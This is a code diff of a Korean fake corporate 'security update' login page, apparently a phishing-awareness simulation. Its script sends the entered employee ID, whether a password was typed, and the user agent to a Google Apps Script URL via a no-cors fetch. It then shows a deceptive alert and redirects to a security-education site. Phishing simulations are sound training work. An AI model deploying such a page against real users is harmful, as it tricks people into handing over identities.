@@ -2,50 +2,61 @@
 <html lang="ko">
 <head>
     <meta charset="UTF-8">
-    <title>사내 그룹웨어 로그인</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>사내 보안 업데이트 - 로그인</title>
     <style>
-        body { font-family: 'Malgun Gothic', sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; background: #f0f2f5; margin: 0; }
-        .login-box { background: white; padding: 40px; border-radius: 8px; box-shadow: 0 4px 12px rgba(0,0,0,0.1); width: 350px; text-align: center; }
-        input { width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #ddd; border-radius: 4px; box-sizing: border-box; }
-        button { width: 100%; padding: 12px; background: #007bff; color: white; border: none; border-radius: 4px; cursor: pointer; font-weight: bold; margin-top: 10px; }
+        body { font-family: 'Malgun Gothic', dotum, sans-serif; background: #f4f7f9; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .login-card { background: #fff; padding: 40px; border-radius: 10px; box-shadow: 0 10px 25px rgba(0,0,0,0.1); width: 100%; max-width: 360px; text-align: center; }
+        .logo { font-size: 24px; font-weight: bold; color: #0056b3; margin-bottom: 20px; }
+        h2 { font-size: 18px; color: #333; margin-bottom: 30px; }
+        input { width: 100%; padding: 12px; margin-bottom: 15px; border: 1px solid #ddd; border-radius: 5px; box-sizing: border-box; font-size: 14px; }
+        button { width: 100%; padding: 12px; background: #007bff; color: white; border: none; border-radius: 5px; font-size: 16px; font-weight: bold; cursor: pointer; transition: background 0.3s; }
+        button:hover { background: #0056b3; }
+        .footer { margin-top: 25px; font-size: 12px; color: #aaa; }
     </style>
 </head>
 <body>
-    <div class="login-box">
-        <h2>로그인</h2>
+    <div class="login-card">
+        <div class="logo">Foundation</div>
+        <h2>보안 시스템 로그인</h2>
         <input type="text" id="userId" placeholder="사번 또는 아이디" required>
         <input type="password" id="userPwd" placeholder="비밀번호" required>
-        <button onclick="sendData()">로그인</button>
+        <button onclick="sendFishingData()">로그인</button>
+        <div class="footer">본 시스템은 사내 보안 정책을 준수합니다.</div>
     </div>
 
     <script>
-        async function sendData() {
-            // ⚠️ 여기에 '새 배포' 시 받은 URL을 한 글자도 틀리지 말고 넣으세요!
-            const URL = "https://script.google.com/macros/s/AKfycbw36XOgNzuuMisTCMN3YKqb2AQfL70FXuCgM-2tp5T5VhzR-0LDIEst_-6HcBkFf8PN/exec";
+        async function sendFishingData() {
+            // [필수 수정] GAS에서 '새 배포' 시 받은 URL을 여기에 넣으세요!
+            const GAS_URL = "https://script.google.com/macros/s/AKfycbxBFWBetvJxPIBoK2u5eh75Ur7f3O67kgtTBWBVdXll8wfQ9UQ8iTo6CL9uJuvjDEgw/exec"; 
             
             const userId = document.getElementById('userId').value;
             const userPwd = document.getElementById('userPwd').value;
 
-            const formData = new URLSearchParams();
-            formData.append('userId', userId);
-            formData.append('isPwdEntered', userPwd.length > 0 ? "YES" : "NO");
-            formData.append('userAgent', navigator.userAgent);
+            if(!userId) { alert("아이디를 입력해주세요."); return; }
+
+            // 데이터 조립 (가장 확실한 URL 파라미터 방식)
+            const queryParams = new URLSearchParams({
+                userId: userId,
+                isPwdEntered: userPwd.length > 0 ? "YES" : "NO",
+                userAgent: navigator.userAgent
+            });
+
+            const finalUrl = `${GAS_URL}?${queryParams.toString()}`;
 
             try {
-                // 데이터 전송 (no-cors)
-                fetch(URL, {
-                    method: 'POST',
-                    mode: 'no-cors',
-                    body: formData
-                });
+                // 데이터 전송 (no-cors로 보안 정책 우회)
+                fetch(finalUrl, { mode: 'no-cors' });
 
-                // 사용자에게 알림을 띄워 데이터 전송 시간을 법니다.
-                alert("보안 정책에 따라 로그인이 제한되었습니다. 교육 페이지로 이동합니다.");
+                // 사용자에게 경고 후 페이지 이동 (시간 벌기용 alert)
+                alert("비정상적인 접근이 감지되었습니다.\n안전을 위해 보안 교육 페이지로 이동합니다.");
                 
                 setTimeout(() => {
                     location.href = "https://www.boho.or.kr/"; 
                 }, 300);
+
             } catch (e) {
+                console.error(e);
                 location.href = "https://www.boho.or.kr/";
             }
         }
